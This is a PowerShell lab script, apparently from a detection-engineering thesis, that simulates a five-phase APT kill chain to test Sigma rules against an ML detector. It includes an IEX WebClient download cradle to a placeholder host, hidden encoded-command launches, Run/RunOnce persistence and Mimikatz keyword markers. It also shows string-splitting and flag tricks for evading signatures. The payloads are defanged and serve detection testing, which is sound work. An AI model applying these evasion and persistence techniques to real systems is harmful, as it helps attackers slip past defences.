<#
.SYNOPSIS
    APT-style multi-stage attack scenario cho demo RED + AI Agent pipeline.
    Mỗi phase map TRỰC TIẾP với 1 Sigma rule cụ thể trong data/sigma/rules.

.DESCRIPTION
    Kịch bản 5 phase — kill-chain post-exploitation.
    Mỗi phase chạy 1 trong 4 mode (giống pattern các script demo khác):

    benign   : Hành động admin bình thường tương đương. Sigma + RED đều silent.
    baseline : Pattern CHUẨN (canonical). Sigma rule cứng catch được.
    evasion  : Variant để né rule. Sigma MISS, RED ML CATCH.
    chain    : Multi-phase realistic — pha trộn baseline + evasion theo kill-chain.

    Mode "evasion" và "chain" là điểm bán hàng chính.

.NOTES
    LAB-SAFE 100%:
    - Không tải payload từ network, không touch lsass thật.
    - "Dropper" = copy calc.exe (binary Microsoft hợp lệ, an toàn).
    - "C2" = DNS lookup NXDOMAIN.
    - Tất cả marker prefix RED_APT_DEMO_ để search dễ.
    - Auto cleanup file + registry sau khi sleep xong.

.NOTES
    GIỚI HẠN LAB (cần giải thích với GVHD):
    - Trong attack THẬT: parent process của powershell.exe là outlook.exe / winword.exe
      (do macro phishing spawn). Trong lab demo, parent là sshd.exe (do SSH session).
    - Sigma rule dạng "parent=outlook AND child=powershell" sẽ KHÔNG fire trong lab demo.
    - Tuy nhiên các rule dạng "command_line contains pattern X" VẪN fire bình thường
      với baseline/evasion, vì command line là cùng nhau giữa lab và production.
    - → RED ML detection ở tầng command line vẫn được verify đầy đủ trong lab.

.PARAMETER Mode
    benign | baseline | evasion | chain (default: chain)

.PARAMETER Phase
    1-5 để chạy 1 phase riêng. 0 hoặc bỏ qua = tất cả phase theo Mode.
    Hữu ích khi muốn show từng rule match riêng.

.PARAMETER SleepSeconds
    Số giây giữ process powershell.exe alive. Default 240s.

.PARAMETER DryRun
    Chỉ in commands, không thực thi.

.EXAMPLE
    # Chạy chain attack đầy đủ — kích hoạt nhiều Sigma rule mix baseline + evasion
    .\apt_demo_scenario.ps1 -Mode chain

.EXAMPLE
    # Chỉ demo evasion (RED catch, Sigma miss) cho luận văn
    .\apt_demo_scenario.ps1 -Mode evasion

.EXAMPLE
    # Demo riêng Phase 2 (Download Cradle) ở chế độ baseline để xem Sigma rule fire
    .\apt_demo_scenario.ps1 -Mode baseline -Phase 2

.EXAMPLE
    # Activity admin bình thường — đối chứng FP
    .\apt_demo_scenario.ps1 -Mode benign
#>

param(
    [ValidateSet("benign","baseline","evasion","chain")]
    [string]$Mode = "chain",
    [ValidateRange(0,5)]
    [int]$Phase = 0,
    [int]$SleepSeconds = 240,
    [switch]$DryRun
)

$ErrorActionPreference = "Continue"
$DemoTag = "RED_APT_DEMO"
$RunId = ([guid]::NewGuid().ToString().Substring(0, 8))
$DropperPath = "C:\Users\Public\xkj9_demo_$RunId.exe"

function Write-Phase {
    param([int]$Num, [string]$Title, [string]$SigmaRule)
    Write-Host ""
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] === Phase $Num/5 - $Title" -ForegroundColor Cyan
    Write-Host "    Sigma rule target: $SigmaRule" -ForegroundColor DarkCyan
}

function Write-Action {
    param([string]$Description, [string]$Marker = "")
    Write-Host "  -> $Description" -ForegroundColor Gray
    if ($Marker) { Write-Host "     marker: $Marker" -ForegroundColor DarkGray }
}

function Invoke-If {
    param([scriptblock]$Block)
    if ($DryRun) { Write-Host "     [DryRun] skipped" -ForegroundColor Yellow; return }
    try { & $Block } catch { Write-Warning "     Step failed: $($_.Exception.Message)" }
}

function Should-Run {
    param([int]$ThisPhase)
    if ($Phase -eq 0) { return $true }
    return $Phase -eq $ThisPhase
}

# ============================================================
# Intro banner
# ============================================================
Write-Host ""
Write-Host "+================================================================+" -ForegroundColor Magenta
Write-Host "|  RED + AI Agent Demo - APT Kill-Chain Scenario                 |" -ForegroundColor Magenta
Write-Host "|  Mode: $Mode  |  Phase: $(if($Phase -eq 0){'all 5'}else{$Phase})  |  RunId: $RunId" -ForegroundColor Magenta
Write-Host "|  Host: $env:COMPUTERNAME  |  User: $env:USERNAME" -ForegroundColor Magenta
Write-Host "+================================================================+" -ForegroundColor Magenta
if ($DryRun) {
    Write-Host "  *** DRY RUN - chi in command, khong thuc thi ***" -ForegroundColor Yellow
}

# ============================================================
# PHASE 1 - Execution (PowerShell encoded command)
# ============================================================
# Event type: Sysmon EID 1 (process_creation) + PowerShell EID 4104
# Config: config/process_creation.yaml + config/powershell.yaml
# Sigma rule target:
#   posh_ps_susp_invocation_specific
#   proc_creation_win_powershell_encoded_command (literal '-EncodedCommand')
# Evasion technique: shorthand flag '-e' (PowerShell parser auto-expand)
if (Should-Run 1) {
    Write-Phase 1 "Execution - PowerShell encoded command" "posh_ps_susp_invocation_specific / encoded_command"

    if ($Mode -eq "benign") {
        Write-Action "Admin maintenance: whoami /upn + ipconfig /all" "no -e flag, no base64"
        Invoke-If { whoami /upn | Out-Null; ipconfig /all | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        # baseline: full -EncodedCommand (Sigma catch)
        $payloadText = "Write-Host '${DemoTag}_PHASE1_BASELINE_$RunId'; Start-Sleep $SleepSeconds"
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payloadText))
        Write-Action "powershell.exe -EncodedCommand <base64> (BASELINE: Sigma catch)" "alive $SleepSeconds s"
        Invoke-If {
            Start-Process powershell.exe -ArgumentList "-NoProfile","-EncodedCommand",$encoded `
                -WindowStyle Hidden -PassThru | Select-Object Id | Format-Table -HideTableHeaders
        }
    }
    elseif ($Mode -eq "evasion") {
        # evasion: shorthand '-e' flag — Sigma MISS, RED CATCH
        $payloadText = "Write-Host '${DemoTag}_PHASE1_EVASION_$RunId'; Start-Sleep $SleepSeconds"
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payloadText))
        Write-Action "powershell.exe -e <base64> (EVASION: shorthand flag, Sigma miss)" "alive $SleepSeconds s"
        Invoke-If {
            Start-Process powershell.exe -ArgumentList "-NoProfile","-e",$encoded `
                -WindowStyle Hidden -PassThru | Select-Object Id | Format-Table -HideTableHeaders
        }
    }
}

# ============================================================
# PHASE 2 - Download Cradle (IEX + DownloadString)
# ============================================================
# Event type: PowerShell ScriptBlock (EID 4104)
# Config: config/powershell.yaml
# Sigma rule target:
#   posh_ps_susp_download.yml — match 'System.Net.WebClient' + '.DownloadString'
# Evasion: '&' operator thay 'IEX' + split string
if (Should-Run 2) {
    Write-Phase 2 "Download Cradle - IEX + WebClient" "posh_ps_susp_download.yml"

    if ($Mode -eq "benign") {
        Write-Action "Invoke-WebRequest tới CDN nội bộ (whitelist)" "không có WebClient/DownloadString"
        Invoke-If { Invoke-WebRequest -Uri "http://127.0.0.1/healthcheck" -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        # baseline: IEX (New-Object System.Net.WebClient).DownloadString(...)
        # Note: lab-safe — URL NXDOMAIN, không có payload thật, chỉ sinh ScriptBlockText
        $scriptText = "IEX (New-Object System.Net.WebClient).DownloadString('http://red-demo-cradle.invalid/${DemoTag}_PHASE2_BASELINE_$RunId.ps1')"
        Write-Action "IEX (New-Object System.Net.WebClient).DownloadString(...)" "BASELINE: Sigma catch"
        Invoke-If {
            try { $sb = [ScriptBlock]::Create($scriptText); & $sb } catch { Write-Host "     (lookup NXDOMAIN expected)" -ForegroundColor DarkGray }
        }
    }
    elseif ($Mode -eq "evasion") {
        # evasion: dùng '&' operator + concatenation để né literal match
        $part1 = "'Sys' + 'tem.Net.WebCl' + 'ient'"
        $part2 = "'.Down' + 'loadStr' + 'ing'"
        $scriptText = @"
`$type = ($part1)
`$method = ($part2)
`$wc = New-Object -TypeName `$type
Write-Host '${DemoTag}_PHASE2_EVASION_$RunId calling' `$type`$method 'on red-demo-cradle.invalid'
# Lab-safe: không actually invoke vì URL không tồn tại
"@
        Write-Action "WebClient + DownloadString split concat (EVASION)" "Sigma miss vì literal không xuất hiện"
        Invoke-If {
            try { $sb = [ScriptBlock]::Create($scriptText); & $sb } catch { }
        }
    }
}

# ============================================================
# PHASE 3 - Persistence (Registry Run key)
# ============================================================
# Event type: Sysmon EID 13 (registry SetValue)
# Config: config/registry_event.yaml
# Sigma rule target:
#   registry rules cho HKCU\...\Run + RunOnce
# Evasion: dùng RunOnce thay Run, hoặc encoded path
if (Should-Run 3) {
    Write-Phase 3 "Persistence - Registry Run key" "registry_set_persistence_run_keys"

    $regRun     = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regRunOnce = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    $regName    = "${DemoTag}_PERSIST_$RunId"

    if ($Mode -eq "benign") {
        Write-Action "Add Run key cho admin tool đã ký số (OneDrive equivalent)" "path Microsoft, không có dropper"
        Invoke-If {
            New-ItemProperty -Path $regRun -Name "${DemoTag}_BENIGN_$RunId" `
                             -Value "C:\Program Files\Microsoft OneDrive\OneDrive.exe /background" `
                             -PropertyType String -Force | Out-Null
        }
    }
    elseif ($Mode -in "baseline","chain") {
        # baseline: Run key trỏ vào dropper trong C:\Users\Public (suspicious path)
        Write-Action "Drop calc.exe -> $DropperPath, add HKCU\...\Run (BASELINE)" "Sigma catch path Users\\Public"
        Invoke-If {
            Copy-Item C:\Windows\System32\calc.exe $DropperPath -Force
            New-ItemProperty -Path $regRun -Name $regName -Value $DropperPath `
                             -PropertyType String -Force | Out-Null
        }
    }
    elseif ($Mode -eq "evasion") {
        # evasion: RunOnce thay Run + encoded path component
        Write-Action "Drop calc.exe -> $DropperPath, add HKCU\...\RunOnce (EVASION)" "rule chỉ check Run, miss RunOnce"
        Invoke-If {
            Copy-Item C:\Windows\System32\calc.exe $DropperPath -Force
            New-ItemProperty -Path $regRunOnce -Name $regName -Value $DropperPath `
                             -PropertyType String -Force | Out-Null
        }
    }
}

# ============================================================
# PHASE 4 - Defense Evasion (Clear Event Log)
# ============================================================
# Event type: PowerShell ScriptBlock EID 4104
# Config: config/powershell.yaml
# Sigma rule target:
#   posh_ps_susp_clear_eventlog.yml — Clear-EventLog / Eventing.Reader.EventLogSession.ClearLog
# Evasion: split keyword + reflection
if (Should-Run 4) {
    Write-Phase 4 "Defense Evasion - Clear Event Log" "posh_ps_susp_clear_eventlog.yml"

    if ($Mode -eq "benign") {
        Write-Action "Liệt kê event log (Get-EventLog -List)" "không có Clear"
        Invoke-If { Get-EventLog -List | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        # baseline: Clear-EventLog literal — Sigma catch
        $scriptText = "Write-Host '${DemoTag}_PHASE4_BASELINE_$RunId'; Get-Command Clear-EventLog | Out-Null"
        Write-Action "Get-Command Clear-EventLog (BASELINE: literal 'Clear-EventLog')" "Sigma catch"
        Invoke-If { try { $sb = [ScriptBlock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # evasion: split keyword với concatenation — Sigma miss literal
        $scriptText = @"
Write-Host '${DemoTag}_PHASE4_EVASION_$RunId'
`$cmdName = 'Clear' + '-Event' + 'Log'
Write-Host 'Simulated invoke:' `$cmdName '-LogName Application'
# Lab-safe: chỉ sinh ScriptBlockText với keyword split, không thật execute
"@
        Write-Action "'Clear' + '-Event' + 'Log' concatenation (EVASION)" "Sigma miss vì không có literal"
        Invoke-If { try { $sb = [ScriptBlock]::Create($scriptText); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 5 - Credential Access marker (Mimikatz keywords)
# ============================================================
# Event type: PowerShell ScriptBlock EID 4104
# Config: config/powershell.yaml
# Sigma rule target:
#   posh_ps_potential_invoke_mimikatz.yml — sekurlsa::logonpasswords / DumpCreds+DumpCerts
# Evasion: split keyword (sekurlsa::logon + passwords concatenate)
# LAB-SAFE: chỉ sinh marker, KHÔNG touch lsass thật
if (Should-Run 5) {
    Write-Phase 5 "Credential Access marker (LAB-SAFE)" "posh_ps_potential_invoke_mimikatz.yml"

    if ($Mode -eq "benign") {
        Write-Action "Liệt kê local user (Get-LocalUser)" "không có Mimikatz keyword"
        Invoke-If { Get-LocalUser -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        # baseline: literal 'sekurlsa::logonpasswords' — Sigma catch
        $scriptText = @"
Write-Host '${DemoTag}_PHASE5_BASELINE_$RunId'
# LAB-SAFE marker only — KHÔNG thực thi Mimikatz
`$mimikatzCmd = 'sekurlsa::logonpasswords'
Write-Host 'Demo marker for SIEM/RED detection:' `$mimikatzCmd
"@
        Write-Action "ScriptBlock với literal 'sekurlsa::logonpasswords' (BASELINE)" "Sigma catch"
        Invoke-If { try { $sb = [ScriptBlock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # evasion: concat keyword để né literal match
        $scriptText = @"
Write-Host '${DemoTag}_PHASE5_EVASION_$RunId'
# LAB-SAFE marker only
`$part1 = 'sek' + 'urlsa'
`$part2 = '::log' + 'onpasswords'
`$keyword = `$part1 + `$part2
Write-Host 'Demo marker (split for evasion):' `$keyword
"@
        Write-Action "'sek' + 'urlsa' + '::log' + 'onpasswords' concat (EVASION)" "Sigma miss vì split"
        Invoke-If { try { $sb = [ScriptBlock]::Create($scriptText); & $sb } catch { } }
    }
}

# ============================================================
# Summary
# ============================================================
Write-Host ""
Write-Host "+================================================================+" -ForegroundColor Green
Write-Host "|  Demo done - check log via Kibana / Velociraptor                |" -ForegroundColor Green
Write-Host "+================================================================+" -ForegroundColor Green
Write-Host ""
Write-Host "  Mode    : $Mode"
Write-Host "  RunId   : $RunId"
Write-Host "  Marker  : ${DemoTag}_PHASE*_$RunId"
Write-Host ""
Write-Host "  Tiếp theo:"
Write-Host "    1. Kibana Discover -> 'logs-winlog*' -> search '$RunId'"
Write-Host "       (sẽ thấy Sysmon EID 1 + PowerShell EID 4104 + Registry EID 13)"
Write-Host "    2. Kibana Security -> Alerts (Sigma rule baseline catch)"
Write-Host "    3. Kibana Discover -> 'red-alerts*' (RED ML catch cả baseline + evasion)"
Write-Host "    4. agent.daemon picks up -> 8-agent pipeline runs -> ai-investigations"
Write-Host ""

if (-not $DryRun) {
    # Background auto-cleanup
    $cleanup = {
        param($Tag, $RunIdArg, $Sleep)
        Start-Sleep -Seconds ($Sleep + 30)
        Remove-Item "C:\Users\Public\xkj9_demo_$RunIdArg.exe" -Force -ErrorAction SilentlyContinue
        foreach ($key in @("HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                           "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")) {
            $names = (Get-Item $key -ErrorAction SilentlyContinue |
                      Select-Object -ExpandProperty Property) |
                     Where-Object { $_ -like "${Tag}_*_$RunIdArg" }
            foreach ($n in $names) {
                Remove-ItemProperty -Path $key -Name $n -ErrorAction SilentlyContinue
            }
        }
    }
    Start-Job -ScriptBlock $cleanup -ArgumentList $DemoTag, $RunId, $SleepSeconds | Out-Null
    Write-Host "  Auto-cleanup sẽ chạy sau $($SleepSeconds + 30) giây." -ForegroundColor DarkGray
}

Write-Host ""
